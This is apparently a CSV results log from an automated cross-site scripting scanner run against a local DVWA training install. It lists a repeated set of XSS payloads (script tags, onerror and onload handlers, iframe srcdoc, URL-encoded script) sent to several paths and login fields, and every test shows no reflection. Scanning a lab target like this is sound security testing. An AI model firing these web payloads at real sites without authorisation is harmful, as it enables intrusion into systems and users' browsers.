page_url,param_tested,method,payload,status,reflected,dom_rendered,stored_candidate_pages,evidence,baseline_len,response_len
http://127.0.0.1/dvwa/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/includes/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1377,1377
http://127.0.0.1/dvwa/includes/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1377,1377
http://127.0.0.1/dvwa/js/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1173,1173
http://127.0.0.1/dvwa/js/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1173,1173
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/images/,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
http://127.0.0.1/dvwa/images/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
http://127.0.0.1/dvwa/css/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
http://127.0.0.1/dvwa/css/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
http://127.0.0.1/dvwa/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
http://127.0.0.1/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://127.0.0.1/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://127.0.0.1/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
